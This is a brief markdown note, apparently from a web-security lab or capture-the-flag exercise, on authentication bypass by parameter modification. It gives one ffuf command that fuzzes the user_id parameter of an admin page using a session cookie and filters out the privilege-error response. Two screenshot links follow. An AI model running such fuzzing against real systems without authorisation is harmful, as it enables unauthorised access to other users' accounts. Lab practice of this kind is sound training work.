# [Authentication Bypass via Parameter Modification](Authentication%20Bypass%20via%20Parameter%20Modification.md)

```sh
ffuf -w wordlist.txt \
  -u "http://154.57.164.82:32027/admin.php?user_id=FUZZ" \
  -b "PHPSESSID=1ft4d8qd9tsca1gt7p2kjgkbl2" \
  -fr "Could not load admin data. Please check your privileges."
```
![](Screenshot%202026-09-14%20at%2010.21.25.png)![](Screenshot%202026-09-14%20at%2010.21.38.png)